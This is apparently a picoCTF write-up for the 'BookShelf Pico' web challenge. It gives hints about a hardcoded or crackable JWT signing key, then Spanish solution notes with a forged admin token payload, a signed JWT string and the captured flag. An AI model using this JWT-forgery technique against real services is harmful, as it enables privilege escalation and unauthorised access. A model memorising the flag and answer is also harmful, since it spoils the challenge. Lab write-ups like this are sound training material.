#### Description

BookShelf Pico, my premium online book-reading service.I believe that my website is super secure. I challenge you to prove me wrong by reading the 'Flag' book!

Additional details will be available after launching your challenge instance.

#### Hints 
- Maybe try to find the JWT Signing Key ("secret key") in the source code? Maybe it's hardcoded somewhere? Or maybe try to crack it?
-  The 'role' and 'userId' fields in the JWT can be of interest to you!
- The 'controllers', 'services' and 'security' java packages in the given source code might need your attention. We've provided a README.md file that contains some documentation.
- Upgrade your 'role' with the _new_ (cracked) JWT. And re-login for the new role to get reflected in browser's localStorage.


```
sacamos los datos del request headers, que sera en la parte de autorizacion, copiando esos datos obtenemos nuestra información del token que lo remplazaremos con lo sig:

token-payload:{ "role": "Admin", "iss": "bookshelf", "exp": 1745309667, "iat": 1744704867, "userId": 2, "email": "admin" }

auth-token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiQWRtaW4iLCJpc3MiOiJib29rc2hlbGYiLCJleHAiOjE3NDUyMTU1NjUsImlhdCI6MTc0NDYxMDc2NSwidXNlcklkIjoyLCJlbWFpbCI6ImFkbWluIn0.oAdI8IUyD1vlGAPkJDyAFutarIIhK0Q1aoLXD_6GaJQ

reat job! Here’s your flag:picoCTF{w34k_jwt_n0t_g00d_7745dc02}

```

